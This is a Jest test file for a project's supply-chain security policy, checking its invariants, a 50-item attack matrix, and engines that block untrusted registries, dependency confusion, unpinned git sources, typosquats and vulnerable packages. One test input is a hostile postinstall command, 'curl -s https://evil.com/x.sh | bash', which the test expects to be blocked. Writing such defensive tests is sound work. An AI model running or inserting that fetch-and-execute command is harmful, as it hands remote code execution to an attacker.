import {
  S10_TICKET_ID,
  S10_PHASE,
  S10_PRIORITY,
  S10_TYPE,
  S10_STATUS,
  S10_DEPENDS_ON,
  S10_BLOCKS,
  S10_CANONICAL_GATE,
  S10_SECONDARY_GATE,
  S10_FROZEN_PRINCIPLE,
  S10_PRINCIPLES,
  S10_INVARIANTS,
  S10_50_ATTACK_MATRIX,
  evaluateSupplyChain50Vector,
  verifyS10Certification,
} from './s-10-supply-chain.contract';

import { DependencyPolicyEngine } from './dependency-policy';
import { DependencyIntegrityEngine } from './dependency-integrity';
import { DependencyAuditEngine } from './dependency-audit';
import { DependencyProvenanceEngine } from './dependency-provenance';
import { PackageSourcePolicyEngine } from './package-source-policy';
import {
  TRUSTED_REGISTRIES,
  APPROVED_INTERNAL_SCOPES,
  APPROVED_LICENSES,
  PROHIBITED_LICENSES,
  KNOWN_TRUSTED_PACKAGES,
} from './dependency-allowlist';
import {
  KNOWN_MALICIOUS_PACKAGES,
  BLOCKED_SCRIPT_PATTERNS,
} from './dependency-denylist';

describe('S-10 — Master Supply Chain Security Contract & 50-Vector Attack Matrix Spec', () => {
  describe('1. Contract Metadata & Certification Invariants', () => {
    it('verifies ticket identity, phase, priority, dependencies, and blocking status', () => {
      expect(S10_TICKET_ID).toBe('S-10');
      expect(S10_PHASE).toBe('Production Security Hardening');
      expect(S10_PRIORITY).toBe('P0 — BLOCKING');
      expect(S10_STATUS).toBe('CERTIFIED_DEPENDENCY_SUPPLY_CHAIN_SECURITY');
      expect(S10_DEPENDS_ON).toEqual([
        'S-01',
        'S-02',
        'S-03',
        'S-04',
        'S-05',
        'S-06',
        'S-07',
        'S-08',
        'S-09',
      ]);
      expect(S10_BLOCKS).toContain('Production Release');
      expect(S10_BLOCKS).toContain('S-11');
      expect(S10_BLOCKS).toContain('S-12');
    });

    it('verifies frozen principle "The software we depend on is part of our security boundary."', () => {
      expect(S10_FROZEN_PRINCIPLE).toBe(
        'The software we depend on is part of our security boundary.',
      );
      expect(S10_PRINCIPLES.S10_P01_SECURITY_BOUNDARY_DEPENDENCY).toBe(
        'The software we depend on is part of our security boundary.',
      );
      expect(S10_PRINCIPLES.S10_P02_NEVER_ASSUME_SAFETY).toContain(
        'Nebula must never assume that: a popular package is automatically safe',
      );
      expect(S10_PRINCIPLES.S10_P03_DETERMINISTIC_LOCKFILE_GRAPH).toContain(
        'Deterministic Lockfile Graph',
      );
      expect(S10_PRINCIPLES.S10_P04_TRANSITIVE_GOVERNANCE).toContain(
        'Transitive Dependency Governance',
      );
      expect(S10_PRINCIPLES.S10_P05_FAIL_CLOSED_SUPPLY_CHAIN).toContain(
        'Fail Closed',
      );
    });

    it('asserts all 20 P0 security invariants exist with deterministic fail-closed decisions', () => {
      const invariants = Object.values(S10_INVARIANTS);
      expect(invariants.length).toBe(20);

      expect(S10_INVARIANTS['S10-I01'].failClosedDecision).toBe(
        'LOCKFILE_INTEGRITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I02'].failClosedDecision).toBe(
        'IMMUTABLE_RESOLUTION_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I03'].failClosedDecision).toBe(
        'UNAUTHORIZED_INTRODUCTION_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I04'].failClosedDecision).toBe(
        'TRANSITIVE_GOVERNANCE_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I05'].failClosedDecision).toBe(
        'VULNERABILITY_BLOCKING_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I06'].failClosedDecision).toBe(
        'DEPENDENCY_CONFUSION_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I07'].failClosedDecision).toBe(
        'TYPOSQUATTING_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I08'].failClosedDecision).toBe(
        'REGISTRY_TRUST_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I09'].failClosedDecision).toBe(
        'PACKAGE_INTEGRITY_VERIFIED',
      );
      expect(S10_INVARIANTS['S10-I10'].failClosedDecision).toBe(
        'POST_INSTALL_SCRIPT_GOVERNED',
      );
      expect(S10_INVARIANTS['S10-I11'].failClosedDecision).toBe(
        'BUILD_TOOL_SECURITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I12'].failClosedDecision).toBe(
        'PRODUCTION_MINIMIZATION_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I13'].failClosedDecision).toBe(
        'LIFECYCLE_MANAGEMENT_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I14'].failClosedDecision).toBe(
        'LICENSE_GOVERNANCE_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I15'].failClosedDecision).toBe(
        'MALICIOUS_PACKAGE_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I16'].failClosedDecision).toBe(
        'REPRODUCIBLE_BUILD_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I17'].failClosedDecision).toBe(
        'CICD_GATE_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I18'].failClosedDecision).toBe(
        'SECRET_EXPOSURE_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I19'].failClosedDecision).toBe(
        'UPDATE_DISCIPLINE_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I20'].failClosedDecision).toBe(
        'FAIL_CLOSED_SUPPLY_CHAIN_ENFORCED',
      );
    });
  });

  describe('2. 50-Vector Attack Matrix Full Coverage', () => {
    it('contains all 50 attack vectors categorized across the 5 domains', () => {
      expect(S10_50_ATTACK_MATRIX.length).toBe(50);

      // Verify categories
      const depIntegrity = S10_50_ATTACK_MATRIX.filter(
        (v) => v.category === 'Dependency Integrity',
      );
      const vulnMgmt = S10_50_ATTACK_MATRIX.filter(
        (v) => v.category === 'Vulnerability Management',
      );
      const pkgIdentity = S10_50_ATTACK_MATRIX.filter(
        (v) => v.category === 'Package Identity',
      );
      const buildExec = S10_50_ATTACK_MATRIX.filter(
        (v) => v.category === 'Build & Execution',
      );
      const governance = S10_50_ATTACK_MATRIX.filter(
        (v) => v.category === 'Governance',
      );

      expect(depIntegrity.length).toBe(10);
      expect(vulnMgmt.length).toBe(10);
      expect(pkgIdentity.length).toBe(10);
      expect(buildExec.length).toBe(10);
      expect(governance.length).toBe(10);
    });

    it('evaluates every single vector from S10-01 to S10-50 successfully', () => {
      for (let i = 1; i <= 50; i++) {
        const id = `S10-${i < 10 ? '0' + i : i}`;
        const evaluated = evaluateSupplyChain50Vector(id);
        expect(evaluated.id).toBe(id);
        expect(evaluated.failClosedDecision).toBeDefined();
        expect(evaluated.scenario).toBeDefined();
        expect(evaluated.expectedResult).toBeDefined();
      }
    });

    it('evaluates Package Source Policy against malicious / unapproved origins', () => {
      // S10-04, S10-25: Unauthorized registry
      const regEval = PackageSourcePolicyEngine.evaluateRegistry(
        'https://evil-npm-registry.cn/pkg',
      );
      expect(regEval.allowed).toBe(false);
      expect(regEval.failClosedDecision).toBe('REGISTRY_TRUST_ENFORCED');

      // S10-21, S10-27: Dependency confusion on internal scope
      const scopeEval = PackageSourcePolicyEngine.evaluatePackageScope(
        '@nebula/core',
        'https://registry.npmjs.org',
        false,
      );
      expect(scopeEval.allowed).toBe(false);
      expect(scopeEval.failClosedDecision).toBe('DEPENDENCY_CONFUSION_BLOCKED');

      // S10-28, S10-29: Untrusted / unpinned Git dependencies
      const unpinnedGit = PackageSourcePolicyEngine.evaluateGitSource(
        'git+https://github.com/evil/pkg.git#main',
      );
      expect(unpinnedGit.allowed).toBe(false);
      expect(unpinnedGit.failClosedDecision).toBe(
        'IMMUTABLE_RESOLUTION_ENFORCED',
      );

      const pinnedGit = PackageSourcePolicyEngine.evaluateGitSource(
        'git+https://github.com/trusted/pkg.git#e4d909c290d0fb1ca068ffaddf22cbd0add91718',
      );
      expect(pinnedGit.allowed).toBe(true);

      // S10-30: Arbitrary tarball
      const tarballEval = PackageSourcePolicyEngine.evaluateTarballSource(
        'https://compromised-site.com/drop.tgz',
      );
      expect(tarballEval.allowed).toBe(false);
      expect(tarballEval.failClosedDecision).toBe('REGISTRY_TRUST_ENFORCED');
    });

    it('evaluates Post-Install Script Governance against hostile commands', () => {
      // S10-31, S10-32: Malicious postinstall script with curl | bash
      const scriptEval = DependencyPolicyEngine.evaluateLifecycleScript(
        'postinstall',
        'curl -s https://evil.com/x.sh | bash',
      );
      expect(scriptEval.allowed).toBe(false);
      expect(scriptEval.decision).toBe('REMOTE_CODE_EXECUTION_BLOCKED');
    });

    it('evaluates Vulnerability & Abandonment Controls', () => {
      // S10-11: Critical CVE
      const critResult = DependencyAuditEngine.evaluateVulnerability({
        packageName: 'express',
        affectedVersions: '<4.0.0',
        severity: 'CRITICAL',
        cveId: 'CVE-2026-9999',
        isTransitive: false,
        description: 'Critical prototype pollution',
      });
      expect(critResult.passed).toBe(false);
      expect(critResult.decision).toBe('VULNERABILITY_GATE_BLOCKED');

      // S10-17: Abandoned package
      const abandoned = DependencyAuditEngine.evaluateAbandonedDependency({
        packageName: 'dead-pkg',
        daysSinceLastRelease: 800,
        hasKnownUnpatchedCve: true,
        hasActiveMaintainer: false,
      });
      expect(abandoned.passed).toBe(false);
      expect(abandoned.decision).toBe('ABANDONED_DEPENDENCY_DETECTED');
    });

    it('evaluates Typosquatting Defense', () => {
      // S10-22: Typosquatted package
      const typoEval = DependencyPolicyEngine.evaluatePackageName('reactt');
      expect(typoEval.allowed).toBe(false);
      expect(typoEval.decision).toBe('TYPOSQUATTING_BLOCKED');
    });
  });

  describe('3. Certification Gate Statement Validation', () => {
    it('validates canonical certification statement and secondary gate', () => {
      expect(verifyS10Certification(S10_CANONICAL_GATE)).toBe(true);
      expect(verifyS10Certification(S10_SECONDARY_GATE)).toBe(true);
    });

    it('rejects tampered or empty certification claims', () => {
      expect(verifyS10Certification('')).toBe(false);
      expect(verifyS10Certification('Unauthorized release claim')).toBe(false);
    });
  });
});
